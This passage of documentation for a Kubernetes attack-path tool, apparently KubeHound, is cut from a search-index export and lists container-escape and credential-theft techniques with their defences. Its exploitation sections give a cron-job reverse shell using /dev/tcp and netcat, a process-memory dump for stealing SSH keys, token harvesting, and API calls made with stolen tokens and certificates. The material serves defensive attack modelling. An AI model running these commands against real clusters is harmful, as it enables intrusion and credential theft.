hostname\n</code></pre>"},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/#notes","title":"Notes","text":"<p>The <code>-s</code> is important otherwise, <code>crictl</code> will try to use the http endpoint to run the command, resulting in errors like:</p> <pre><code>FATA[0000] execing command in container: error sending request: Post \"http://127.0.0.1:41903/exec/PUpJoUv0\": dial tcp 127.0.0.1:41903: connect: connection refused\n</code></pre> <p>With crictl you can also access sensitive information: + <code>crictl inspect</code>: access env variable from any container + <code>crictl logs</code>: retrieve all the logs from any container</p>"},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/#defences","title":"Defences","text":""},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with a <code>hostPath</code> mount for the following locations:</p> <pre><code>/var/run/dockershim.sock\n/run/containerd/containerd.sock\n/run/crio/crio.sock\n/var/run/cri-dockerd.sock\n</code></pre>"},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/#calculation","title":"Calculation","text":"<ul> <li>ExploitContainerdSock</li> </ul>"},{"location":"reference/attacks/EXPLOIT_CONTAINERD_SOCK/#references","title":"References:","text":"<ul> <li>CRICTL GitHub</li> <li>Debugging Kubernetes nodes with crictl</li> </ul>"},{"location":"reference/attacks/EXPLOIT_HOST_READ/","title":"EXPLOIT_HOST_READ","text":""},{"location":"reference/attacks/EXPLOIT_HOST_READ/#exploit_host_read","title":"EXPLOIT_HOST_READ","text":"Source Destination MITRE ATT&amp;CK Container Node Escape to Host, T1611 <p>Exploit an arbitrary read from a sensitive host path mounted into the container to gain execution on the host.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_READ/#details","title":"Details","text":"<p>If a sensitive host directory is exposed to a container, even as readonly, it can enable an escape to the host. The only example currently modelled is exposing a host volume that contains SSH keys (and assumes that SSH is enabled on the node for SRE activities). In this scenario an attacker can steal the SSH keys from the mounted volume, then SSH directly into the node.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_READ/#prerequisites","title":"Prerequisites","text":"<p>Execution within a container with a sensitive host path mounted as readonly.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_READ/#checks","title":"Checks","text":"<p>Check for interesting mounted volumes in the container as decribed in VOLUME_DISCOVER. Specifically:</p> <ul> <li><code>/etc</code>, <code>/root</code>, <code>/home</code>, <code>/proc</code> for SSH key material. This enables accessing the node via SSH (which is typically enabled for management functionality)</li> </ul>"},{"location":"reference/attacks/EXPLOIT_HOST_READ/#exploitation","title":"Exploitation","text":"<p>Consider the case of an exposed <code>/proc</code> mount. We can attempt to steal SSH keys directly from the process memory of the SSH agent. First identify the target process by dumping all process info via:</p> <pre><code>find /proc -maxdepth 2 -wholename '/proc/[0-9]*/status'  | xargs cat &gt; process-list.txt\n</code></pre> <p>Once the target PID has been retrieved, dump the process memory by reading <code>/proc/${PID}/mem</code>:</p> <pre><code>procdump()\n( \n    cat /proc/$1/maps | grep -Fv \".so\" | grep \" 0 \" | awk '{print $1}' | ( IFS=\"-\"\n    while read a b; do\n        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \\\n           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of=\"$1_mem_$a.bin\"\n    done )\n)\n</code></pre> <p>then exfiltrate the memory dump to an attacker machine using <code>kubectl cp</code> (or any other mechanism):</p> <pre><code>kubectl cp ${NAMESPACE}/${PODNAME}:/mem.bin ./mem.bin\n</code></pre> <p>Finally extract any SSH keys offline from memory using the ssh-grab python script.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_READ/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for access to sensitive host files (e.g SSH keys) originating from container processes</li> </ul>"},{"location":"reference/attacks/EXPLOIT_HOST_READ/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with a <code>hostPath</code> mount of <code>/</code> or other sensitive locations.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_READ/#least-privilege","title":"Least Privilege","text":"<p>Avoid running containers as the <code>root</code> user. Enforce running as an unprivileged user account using the <code>runAsNonRoot</code> setting inside <code>securityContext</code> (or explicitly setting <code>runAsUser</code> to an unprivileged user). Additionally, ensure that <code>allowPrivilegeEscalation: false</code> is set in <code>securityContext</code> to prevent a container running as an unprivileged user from being able to escalate to running as the <code>root</code> user.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_READ/#calculation","title":"Calculation","text":"<ul> <li>ExploitHostRead</li> </ul>"},{"location":"reference/attacks/EXPLOIT_HOST_READ/#references","title":"References:","text":"<ul> <li>Stealing SSH Keys From Memory</li> <li>Dump Linux Process Memory to File</li> </ul>"},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/","title":"EXPLOIT_HOST_TRAVERSE","text":""},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#exploit_host_traverse","title":"EXPLOIT_HOST_TRAVERSE","text":"Source Destination MITRE ATT&amp;CK Volume Volume Unsecured Credentials, T1552 <p>This attack represents the ability to steal a K8s API token from a container via access to a mounted parent volume of the <code>/var/lib/kubelet/pods</code> directory.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#details","title":"Details","text":"<p>An attacker in a container with access to the <code>/var/lib/kubelet/pods</code> directory or any parent directory of the node via a <code>hostPath</code> mount, even readonly, can steal the serviceaccount access tokens of all running pods to perform actions in the K8s API. </p>"},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#prerequisites","title":"Prerequisites","text":"<p>A volume containing K8s API tokens is mounted into a container. The canonical case is a node root filesystem mounted readonly via a host path volume mount.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#checks","title":"Checks","text":"<p>Check for mounted directories that contain the service account token paths:</p> <pre><code># The service account tokens are tmpfs mounts themselves so it is very apparent when they are present\ncat /proc/self/mounts\n\n# ...\n/dev/vda1 /hostpods ext4 ro,relatime,discard 0 0\ntmpfs /hostpods/063c7aae-1965-4824-b4f5-a8e7cdc2d224/volumes/kubernetes.io~projected/kube-api-access-zhzgh tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/648e72af-34a8-4be6-8e7a-9cfac7e7fd94/volumes/kubernetes.io~projected/kube-api-access-hkh28 tmpfs rw,relatime,size=51200k 0 0\ntmpfs /hostpods/b8a7238c-83eb-4392-b055-ad08f8b8a218/volumes/kubernetes.io~projected/kube-api-access-xl5fz tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/5edf50d2-747c-45b2-8b40-210f1bfee866/volumes/kubernetes.io~projected/kube-api-access-2l9sx tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/f80874b0-1a52-4175-9705-550b75743adf/volumes/kubernetes.io~projected/kube-api-access-8ms4p tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/2e2811f3-cfb4-41ea-ae51-8e337357e0d0/volumes/kubernetes.io~projected/kube-api-access-7p2hf tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/37d46741-de8b-45b3-a0a4-874529bb4032/volumes/kubernetes.io~projected/kube-api-access-g8wqm tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/05ae5550-ac58-47a3-b466-c09944240062/volumes/kubernetes.io~projected/kube-api-access-pdqmc tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/3a55670f-a784-4d3c-8231-5bf90c54fc87/volumes/kubernetes.io~projected/kube-api-access-2bf8s tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/b40f8657-5a06-49ed-9128-b807de3281e5/volumes/kubernetes.io~projected/kube-api-access-hjbzn tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/4eb7074e-133f-4ecc-8fa4-a686cf46ba6d/volumes/kubernetes.io~projected/kube-api-access-wqsqv tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/23dab617-9d86-4658-823b-12aaab1f0edc/volumes/kubernetes.io~projected/kube-api-access-xd5fl tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/300cbaef-f0aa-441b-b22d-154bfa31901a/volumes/kubernetes.io~projected/kube-api-access-5xwr4 tmpfs rw,relatime,size=15340756k 0 0\ntmpfs /hostpods/e949b9f2-304b-4664-93e5-d0ca79d69448/volumes/kubernetes.io~projected/kube-api-access-xrbr4 tmpfs rw,relatime,size=15340756k 0 0\n# ...\n</code></pre>"},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#exploitation","title":"Exploitation","text":"<p>If all (or part of) the host filesystem is mounted (/host in our example), steal access tokens for ALL pods running on the node:</p> <pre><code>ls /host/var/lib/kubelet/pods/0dc76586-c18c-4db6-b5f2-019f270d3621\n# containers  etc-hosts  plugins    volume-subpaths  volumes\n\nfind /host/var/lib/kubelet/pods/ -name token -type l 2&gt;/dev/null\n#/host/var/lib/kubelet/pods/5a9fc508-8410-444a-bf63-9f11e5979bee/volumes/kubernetes.io~projected/kube-api-access-225d6/token\n#/host/var/lib/kubelet/pods/a1176593-34a2-43e6-8bdd-ed10fa148fe7/volumes/kubernetes.io~projected/kube-api-access-ng6px/token\n#/host/var/lib/kubelet/pods/10b90d62-6b16-4aa7-9e72-75f18dcca5a8/volumes/kubernetes.io~projected/kube-api-access-j7dsp/token\n#/host/var/lib/kubelet/pods/dfbf38ad-2e92-44e0-b05b-8859350b6ea5/volumes/kubernetes.io~projected/kube-api-access-c89ff/token\n</code></pre> <p>See IDENTITY_ASSUME for how to use a captured token.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#defences","title":"Defences","text":""},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for access to well-known K8s secrets paths from unusual processes.</li> </ul>"},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with a <code>hostPath</code> mount of parents of <code>/var/lib/kubelet/pods</code> or other sensitive locations.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#prevent-service-account-token-automounting","title":"Prevent service account token automounting","text":"<p>When a pod is being created, it automatically mounts a service account (the default is default service account in the same namespace). Not every pod needs the ability to access the API from within itself.</p> <p>From version 1.6+ it is possible to prevent automounting of serviceaccount tokens on pods using:</p> <pre><code>apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: sa1\nautomountServiceAccountToken: false\n</code></pre>"},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#calculation","title":"Calculation","text":"<ul> <li>ExploitHostTraverseToken</li> </ul>"},{"location":"reference/attacks/EXPLOIT_HOST_TRAVERSE/#references","title":"References:","text":"<ul> <li>The Path Less Traveled: Abusing Kubernetes Defaults (Video)</li> <li>The Path Less Traveled: Abusing Kubernetes Defaults (GitHub)</li> <li>Securing Kubernetes Clusters by Eliminating Risky Permissions</li> </ul>"},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/","title":"EXPLOIT_HOST_WRITE","text":""},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#exploit_host_write","title":"EXPLOIT_HOST_WRITE","text":"Source Destination MITRE ATT&amp;CK Container Node Escape to Host, T1611 <p>Exploit an arbitrary write from a sensitive host path mounted into the container to gain execution on the host.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#details","title":"Details","text":"<p>If a sensitive host directory is mounted in a container with write permissions there are a huge variety of techniques to achieve execution within a container. Given the array of techniques available we choose to assume that any writeable mount in a container is exploitable unless it corresponds to an entry in the \"known-good\" list of mounts. For illustration purposes we will consider an escape to host via creating a cron job to launch a reverse shell as the host's superuser if the host <code>/etc</code> directory is mounted with write permissions.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#prerequisites","title":"Prerequisites","text":"<p>Execution within a container with a sensitive host directory mounted with write permissions.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#checks","title":"Checks","text":"<p>Check for interesting mounted volumes in the container as decribed in VOLUME_DISCOVER</p>"},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#exploitation","title":"Exploitation","text":"<p>Assuming the <code>/etc/cron.d</code> directory or any parent is mounted with write access, we can achieve execution on the host as follows. First, resolve the container ip address:</p> <pre><code>CONTAINER_ADDRESS=$(ifconfig eth0  | grep inet | cut -d: -f2 | awk '{ print $2}')\n</code></pre> <p>Then, create a cronjob to trigger a reverse shell connection from the host to our container:</p> <pre><code>echo -n \"* * * * * root /bin/bash -c '/bin/bash -c echo \\\"\\\"; echo \\\"hello from host! \" &gt; /host-etc/cron.d/breakout\necho -n \"$\" &gt;&gt; /host-etc/cron.d/breakout\necho -n \"(hostname) \" &gt;&gt; /host-etc/cron.d/breakout\necho -n \"$\" &gt;&gt; /host-etc/cron.d/breakout\necho \"(id)\\\" &gt;&amp; /dev/tcp/${CONTAINER_ADDRESS}/1337 0&gt;&amp;1'\" &gt;&gt; /host-etc/cron.d/breakout\nnetcat -l -p 1337 2&gt;&amp;1\n</code></pre>"},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#defences","title":"Defences","text":""},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#monitoring","title":"Monitoring","text":"<ul> <li>Leverage cloud workload security solutions to monitor for malicious activity on the host</li> </ul>"},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the creation of pods with a <code>hostPath</code> mount of <code>/</code> or other sensitive locations.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#least-privilege","title":"Least Privilege","text":"<p>Avoid running containers as the <code>root</code> user. Enforce running as an unprivileged user account using the <code>runAsNonRoot</code> setting inside <code>securityContext</code> (or explicitly setting <code>runAsUser</code> to an unprivileged user). Additionally, ensure that <code>allowPrivilegeEscalation: false</code> is set in <code>securityContext</code> to prevent a container running as an unprivileged user from being able to escalate to running as the <code>root</code> user.</p>"},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#calculation","title":"Calculation","text":"<ul> <li>ExploitHostWrite</li> </ul>"},{"location":"reference/attacks/EXPLOIT_HOST_WRITE/#references","title":"References:","text":"<ul> <li>Bad Pods: Kubernetes Pod Privilege Escalation</li> <li>7 Ways to Escape a Container</li> <li>Atomic Red Team T1611</li> </ul>"},{"location":"reference/attacks/IDENTITY_ASSUME/","title":"IDENTITY_ASSUME","text":""},{"location":"reference/attacks/IDENTITY_ASSUME/#identity_assume","title":"IDENTITY_ASSUME","text":"Source Destination MITRE ATT&amp;CK Container, Node Identity Valid Accounts, T1078 <p>Represents the capacity to act as an Identity via ownership of a service account token, user PKI certificate, etc.</p>"},{"location":"reference/attacks/IDENTITY_ASSUME/#details","title":"Details","text":"<p>Authentication to the K8s API is performed via passing certificates, static tokens or OIDC tokens in the API request. This edge represents the ability to assume an identity using either acquired credentials (such as a service account token) or the intrinsic identity of a resource in K8s such as executing commands from inside a pod with a bound serviceaccount.</p>"},{"location":"reference/attacks/IDENTITY_ASSUME/#prerequisites","title":"Prerequisites","text":"<p>Control of execution within a container with a bound serviceaccount or access to a node file system.</p>"},{"location":"reference/attacks/IDENTITY_ASSUME/#checks","title":"Checks","text":""},{"location":"reference/attacks/IDENTITY_ASSUME/#container","title":"Container","text":"<p>Check for a mounted service account tokens or secrets:</p> <pre><code>ls -la /var/run/secrets/kubernetes.io/serviceaccount/\n</code></pre>"},{"location":"reference/attacks/IDENTITY_ASSUME/#node","title":"Node","text":"<p>Check the kubelet configuration:</p> <pre><code>cat $NODE_ROOT/etc/kubernetes/kubelet.conf \n</code></pre> <p>This should contain the paths of the kubelet user certificates that we can steal to impersonate the node user:</p> <pre><code>users:\n- name: default-auth\n  user:\n    client-certificate: /var/lib/kubelet/pki/kubelet-client-current.pem\n    client-key: /var/lib/kubelet/pki/kubelet-client-current.pem\n</code></pre> <p>Check the file(s) are accessible:</p> <pre><code>ls -la $NODE_ROOT/var/lib/kubelet/pki/kubelet-client-current.pem\n</code></pre>"},{"location":"reference/attacks/IDENTITY_ASSUME/#exploitation","title":"Exploitation","text":""},{"location":"reference/attacks/IDENTITY_ASSUME/#container_1","title":"Container","text":"<p>Assuming a valid token is recovered from e.g a mounted service account a token is found it can be used to interact with the K8s API, to potentially access new resources:</p> <pre><code>KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\ncurl -sSk -H \"Authorization: Bearer $KUBE_TOKEN\" \\\n      https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/kube-system/secrets\n</code></pre>"},{"location":"reference/attacks/IDENTITY_ASSUME/#node_1","title":"Node","text":"<p>The kubelet PKI certificates can be used to authenticate to either the kubelet or the K8s API:</p> <pre><code> curl -k --cacert $NODE_ROOT/etc/kubernetes/pki/ca.crt --key $NODE_ROOT/var/lib/kubelet/pki/kubelet-client-current.pem --cert {$NODE_ROOT}/var/lib/kubelet/pki/kubelet-client-current.pem https://${NODE_IP}:10250/pods/ \n</code></pre>"},{"location":"reference/attacks/IDENTITY_ASSUME/#defences","title":"Defences","text":""},{"location":"reference/attacks/IDENTITY_ASSUME/#monitoring","title":"Monitoring","text":"<ul> <li>Monitor for installation and/or execution of kubectl within pods. This is anomalous activity but may be triggered by legitimate SRE or developer activities.</li> <li>Interacting directly with the K8s API via non-standard tools e.g curl could be observed via the User-Agent field in audit logs. However, this is attacker controlled so should not be relied on.</li> </ul>"},{"location":"reference/attacks/IDENTITY_ASSUME/#implement-security-policies","title":"Implement security policies","text":"<p>Use a pod security policy or admission controller to prevent or limit the identities under which new pods can run.</p>"},{"location":"reference/attacks/IDENTITY_ASSUME/#calculation","title":"Calculation","text":"<ul> <li>IdentityAssumeContainer</li> <li>IdentityAssumeNode</li> </ul>"},{"location":"reference/attacks/IDENTITY_ASSUME/#references","title":"References:","text":"<ul> <li>Official Kubernetes Documentation</li> <li>CURLing the Kubernetes API</li> <li>Kubelet API Overview</li> <li>Node AuthN/AuthZ</li> </ul>"},{"location":"reference/attacks/IDENTITY_IMPERSONATE/","title":"IDENTITY IMPERSONATE","text":""},{"location":"reference/attacks/IDENTITY_IMPERSONATE/#identity_impersonate","title":"IDENTITY_IMPERSONATE","text":"<p>With a user impersonation privilege an attacker can impersonate a more privileged account.</p> Source Destination MITRE ATT&amp;CK PermissionSet Identity Valid Accounts, T1078 <p>Warning</p> <p>This attack detection is currently NOT IMPLEMENTED.</p>"},{"location":"reference/attacks/IDENTITY_IMPERSONATE/#details","title":"Details","text":"<p>Obtaining the <code>impersonate users/groups</code> permission will allow an attacker to execute K8s API actions on behalf of another user, including those with <code>cluster-admin</code> rights, and other highly privileged users.</p>"},{"location":"reference/attacks/IDENTITY_IMPERSONATE/#prerequisites","title":"Prerequisites","text":"<p>Ability to interrogate the K8s API with a role allowing impersonate access to users and/or groups.</p> <p>See the example pod spec.</p>"},{"location":"reference/attacks/IDENTITY_IMPERSONATE/#checks","title":"Checks","text":"<p>Simply ask kubectl:</p> <pre><code>kubectl auth can-i impersonate users\nkubectl auth can-i impersonate groups\n</code></pre>"},{"location":"reference/attacks/IDENTITY_IMPERSONATE/#exploitation","title":"Exploitation","text":"<p>Execute any action in the K8s API impersonating a privileged group (e.g <code>system:masters</code>) or user using the syntax:</p> <pre><code>$ kubectl &lt;verb&gt; &lt;noun&gt; -as=null -as-group=system:masters -o json | jq\n</code></pre>"},{"location":"reference/attacks/IDENTITY_IMPERSONATE/#defences","title":"Defences","text":""},{"location":"reference/attacks/IDENTITY_IMPERSONATE/#monitoring","title":"Monitoring","text":"<ul> <li>Monitoring the follow-on activity from user impersonation may be a more fruitful endeavour.</li> </ul>"},{"location":"reference/attacks/IDENTITY_IMPERSONATE/#implement-least-privilege-access","title":"Implement least privilege access","text":"<p>Impersonating users is a very powerful privilege and should not be required by the majority of users. Use an automated tool such a KubeHound to search for any risky permissions and users in the cluster and look to eliminate them.</p>"},{"location":"reference/attacks/IDENTITY_IMPERSONATE/#calculation","title":"Calculation","text":"<ul> <li>IdentityImpersonate</li> <li>IdentityImpersonateNamespace</li> </ul>"},{"location":"reference/attacks/IDENTITY_IMPERSONATE/#references","title":"References:","text":"<ul> <li>Official Kubernetes Documentation: Authenticating</li> <li>Securing Kubernetes Clusters by Eliminating Risky Permissions</li> </ul>"},{"location":"reference/attacks/PERMISSION_DISCOVER/","title":"PERMISSION_DISCOVER","text":""},{"location":"reference/attacks/PERMISSION_DISCOVER/#permission_discover","title":"PERMISSION_DISCOVER","text":"<p>Represents the permissions granted to an identity that can be discovered by an attacker.</p> Source Destination MITRE ATT&amp;CK Identity PermissionSet Permission Groups Discovery, T1069"},{"location":"reference/attacks/PERMISSION_DISCOVER/#details","title":"Details","text":"<p>K8s RBAC aggregates sets of API permissions together under <code>Role</code> (namespaced) and <code>ClusterRole</code> (cluster-wide) objects. These are then assigned to specific users via a <code>RoleBinding</code> (namespaced) or <code>ClusterRoleBinding</code> (cluster-wide) objects. This edge represents this relationship granting one or more permissions to an identity, which can be discovered by an attacker.</p>"},{"location":"reference/attacks/PERMISSION_DISCOVER/#prerequisites","title":"Prerequisites","text":"<p>None</p>"},{"location":"reference/attacks/PERMISSION_DISCOVER/#checks","title":"Checks","text":"<p>A full list of identity \u2192 role mappings can be retrieved via:</p> <pre><code>kubectl get rolebindings,clusterrolebindings --all-namespaces -o wide  \n</code></pre> <p>To discover the permissions of the current identity use:</p> <pre><code>kubectl auth can-i --list\n</code></pre>"},{"location":"reference/attacks/PERMISSION_DISCOVER/#exploitation","title":"Exploitation","text":"<p>No exploitation is necessary. This edge simply indicates that an identity grants a specific set of permissions (effectively represents a <code>RoleBinding</code> or <code>ClusterRoleBinding</code> in K8s).</p>"},{"location":"reference/attacks/PERMISSION_DISCOVER/#defences","title":"Defences","text":"<p>None</p>"},{"location":"reference/attacks/PERMISSION_DISCOVER/#calculation","title":"Calculation","text":"<ul> <li>PermissionDiscover</li> </ul>"},{"location":"reference/attacks/PERMISSION_DISCOVER/#references","title":"References:","text":"<ul> <li>Official Kubernetes Documentation:Using RBAC Authorization</li> <li>Kubernetes RBAC Details</li> </ul>"},{"location":"reference/attacks/POD_ATTACH/","title":"POD_ATTACH","text":""},{"location":"reference/attacks/POD_ATTACH/#pod_attach","title":"POD_ATTACH","text":"Source Destination MITRE ATT&amp;CK Node Pod Container Administration Command, T1609 <p>Attach to a running K8s pod from a K8s node.</p>"},{"location":"reference/attacks/POD_ATTACH/#details","title":"Details","text":"<p>A node in K8s is the host of a number of pods. A node has a supervisory function and thus access to the node grants full access to the pods. The only obstacle is the right tooling to interact easily with <code>containerd</code>. </p>"},{"location":"reference/attacks/POD_ATTACH/#prerequisites","title":"Prerequisites","text":"<p>Full access to a node.</p>"},{"location":"reference/attacks/POD_ATTACH/#checks","title":"Checks","text":"<p>Ensure that the node is running containers using containerd via a ps -ef command. You should see an output similar to the below:</p> <pre><code>root@k8s-node:~# ps -ef\nUID          PID    PPID  C STIME TTY          TIME CMD\nroot           1       0  0 09:48 ?        00:00:02 /sbin/init\nroot          86       1  0 09:48 ?        00:00:01 /lib/systemd/systemd-journald\nroot          99       1  1 09:48 ?        00:05:31 /usr/local/bin/containerd\nroot         220       1  2 09:48 ?        00:09:13 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml -\nroot         304       1  0 09:48 ?        00:00:11 /usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id ae35055acaccc10634d9160f08937d71d856be6b0d954cc772e72c83ee9bffee -address /run/containerd/container\nroot         320       1  0 09:48 ?        00:00:11 /usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id ef5d38bf4bf263cbb80f0ea8cb75059e2fc997b9885d649afe0cc7d48e4f8b3f -address /run/containerd/container\n65535        351     304  0 09:48 ?        00:00:00 /pause\n65535        357     320  0 09:48 ?        00:00:00 /pause\nroot         401     320  0 09:48 ?        00:00:09 /usr/local/bin/kube-proxy --config=/var/lib/kube-proxy/config.conf --hostname-override=k8s-gameday-worker\nroot         511     304  0 09:48 ?        00:00:07 /bin/kindnetd\nroot         889       1  0 09:49 ?        00:00:12 /usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id 2446353ed4380ef6e81172b5c09a9191e9e300c93ded0febea42967177aae3d1 -address /run/containerd/container\n65535        909     889  0 09:49 ?        00:00:00 /pause\nroot        1741     889  0 09:49 ?        00:03:47 datadog-cluster-agent start\nroot       12899       1  0 10:07 ?        00:00:11 /usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id 61250b69765dbf0fadb9cdcfa87db7c0b8c4c85ff93051f83e52574a3b4b7bd4 -address /run/containerd/container\n65535      12922   12899  0 10:07 ?        00:00:00 /pause\nroot       12955   12899  0 10:07 ?        00:00:00 /bin/sh -c -- while true; do sleep 30; done;\nroot       50503       1  0 11:13 ?        00:00:37 /usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id 026430a39a6452201524dfbe9872b2eb6027a9bcc2085fa8f7d95096150165c0 -address /run/containerd/container\nroot       50523   50503  0 11:13 ?        00:00:00 /pause\nroot       50854   50503  2 11:13 ?        00:08:06 agent run\nroot       50895   50503  0 11:13 ?        00:01:20 trace-agent -config=/etc/datadog-agent/datadog.yaml\nroot       50940   50503  0 11:13 ?        00:01:58 process-agent --cfgpath=/etc/datadog-agent/datadog.yaml\nroot       51064   50503  0 11:13 ?        00:02:07 security-agent start -c=/etc/datadog-agent/datadog.yaml\nroot      233872       1  0 16:12 ?        00:00:00 /usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id ba0483c7235ccdbc9baf9f2ac0e39bea1cf54c3a16cab068c0c51954bbde99d1 -address /run/containerd/container\n65535     233893  233872  0 16:12 ?        00:00:00 /pause\nroot      233924  233872  0 16:12 pts/0    00:00:00 nsenter --all --target=1 -- su -\nroot      233939  233924  0 16:12 pts/0    00:00:00 su -\nroot      233957  233939  0 16:12 pts/0    00:00:00 -bash\nroot      237272  233957  0 16:17 pts/0    00:00:00 ctr -n k8s.io task exec -t --exec-id full-control 0f36d12d60d12d041df894132882380a1175d462b654d62cc2907994cbf6c238 /bin/sh\nroot      237292  233872  0 16:17 pts/1    00:00:00 /bin/sh\nroot      237719   12955  0 16:18 ?        00:00:00 sleep 30\nroot      237720  237292  0 16:18 pts/1    00:00:00 ps -ef\n</code></pre> <p>Take note of the containerd-shim-runc-v2 processes, in particular the namespace which we will need later! Ensure the ctr utility is installed so we can interact directly with containerd:</p> <p><pre><code>which ctr\n# /usr/local/bin/ctr\n</code></pre> If ctr is not installed, we can install it ourselves:</p> <p><pre><code>curl -L https://github.com/containerd/containerd/releases/download/v1.6.19/containerd-1.6.19-linux-arm64.tar.gz &gt; containerd.tar.gz\ntar -xzf containerd.tar.gz\n</code></pre> Now we can use ctr to examine the running containers:</p> <pre><code>$ ctr -n k8s.io containers ls\nCONTAINER                                                           IMAGE                                            RUNTIME\n07c72331fc4f2ffb7dc385beda170862f93993bd53d69232652fe1d6af83c8a8    docker.io/kindest/kindnetd:v20221004-44d545d1    io.containerd.runc.v2\n33ba7bd90621cca281c99e58a83fe8fe974221085bebedc2de69ccf5988daa43    gcr.io/datadoghq/agent:7.43.0                    io.containerd.runc.v2\n3bc41387a69a36fd031cdedb17aaf41a72faebce15fbad94b5e694600bde7a20    registry.k8s.io/pause:3.7                        io.containerd.runc.v2\n43d816d3044000b37eed5710c2ad3da5f8f4a2e6ede47132238c0034de708612    gcr.io/datadoghq/agent:7.43.0                    io.containerd.runc.v2\n44009453f6cb08fa4f617ef9b8ef5838f3dfc20c10693318b16119af4b37f7d4    registry.k8s.io/pause:3.7                        io.containerd.runc.v2\n53384fe00e0a9846bfe406b4cc7ba84ba2fb34a05a86ea106064d92e648b2715    gcr.io/datadoghq/agent:7.43.0                    io.containerd.runc.v2\n62ff4b5804ebb11a88af9d496afe09d2aa47fa3c0152f3ae90cf347899dcce71    docker.io/library/ubuntu:22.04                   io.containerd.runc.v2\n876ef7a4f348010ce85bc6fd96ce8760c6357d7d24201b1459d8344155f4092f    docker.io/library/ubuntu:22.04                   io.containerd.runc.v2\n8a8f35d4ece179d6cb968d66a1cca3dfb7dfe10b72b221cd5ff3cc42abd60c7f    gcr.io/datadoghq/agent:7.43.0                    io.containerd.runc.v2\na2036c90221e0993fb87a378b002bd43e15c1be2a70be43e7fc6416e99be4446    gcr.io/datadoghq/agent:7.43.0                    io.containerd.runc.v2\na2d0bb15f6e4b7a52d42e79685a2f57b06aa8f6ffbc15a38a1d303289a164e1d    gcr.io/datadoghq/agent:7.43.0                    io.containerd.runc.v2\nbb9790ddf282fdb15c768013da80486989d4fda8f45ab94f70646cc9cce947e7    gcr.io/datadoghq/agent:7.43.0                    io.containerd.runc.v2\nbdcc01c28b288e5c78e1f358716da80556b4a073c24549bc565180979c351891    registry.k8s.io/pause:3.7                        io.containerd.runc.v2\nc5e3934d2e533b8580242f360f8a2e4f99a38d5cb50c9a579bf471869c38f043    gcr.io/datadoghq/agent:7.43.0                    io.containerd.runc.v2\nc952cc4329ba0c822dacbade96153dea12d415c7c80ecb3f4c4a72d895629971    registry.k8s.io/kube-proxy:v1.25.3               io.containerd.runc.v2\nec74a2a48f514861096cf4b7b12550d8ce17d5b0803ec0aaf6a26dda4876e100    registry.k8s.io/pause:3.7                        